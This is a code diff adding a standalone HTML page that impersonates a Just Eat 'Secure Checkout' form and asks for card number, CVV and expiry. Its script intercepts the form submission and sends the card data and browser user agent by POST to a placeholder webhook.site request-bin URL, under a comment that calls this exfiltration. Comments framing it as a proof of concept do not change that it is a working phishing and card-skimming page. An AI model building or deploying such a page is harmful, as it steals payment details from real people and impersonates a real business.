@@ -1,0 +1,38 @@
+<!doctype html>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+  body { font-family: system-ui, -apple-system, Roboto, sans-serif; margin: 16px; }
+  .card { max-width: 420px; margin:auto; padding:16px; border:1px solid #eee; border-radius:12px; }
+  button { padding:10px 16px; border-radius:8px; }
+</style>
+<div class="card">
+  <h2>Just Eat | Secure Checkout</h2>
+  <p>For your security, please confirm your card details.</p>
+  <form id="f">
+    <label>Card number<br><input id="cc" inputmode="numeric" autocomplete="off" required></label><br><br>
+    <label>CVV<br><input id="cvv" type="password" inputmode="numeric" required></label><br><br>
+    <label>Expiry<br><input id="exp" placeholder="01/27" required></label><br><br>
+    <button>Confirm</button>
+  </form>
+  <small id="ua"></small>
+</div>
+<script>
+  // Prove JS executes and we can read device/browser info
+  document.getElementById('ua').textContent = 'UA: ' + navigator.userAgent;
+
+  // Exfiltrate to your request bin (replace URL)
+  const sink = 'https://webhook.site/REPLACE-ME';
+  document.getElementById('f').addEventListener('submit', (e) => {
+    e.preventDefault();
+    const payload = {
+      cc:  document.getElementById('cc').value,
+      cvv: document.getElementById('cvv').value,
+      exp: document.getElementById('exp').value,
+      ua:  navigator.userAgent,
+      now: new Date().toISOString()
+    };
+    fetch(sink, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload) })
+      .then(()=>alert('Thank you'))   // visible proof of JS running
+      .catch(()=>alert('Network error, try again'));
+  });
+</script>
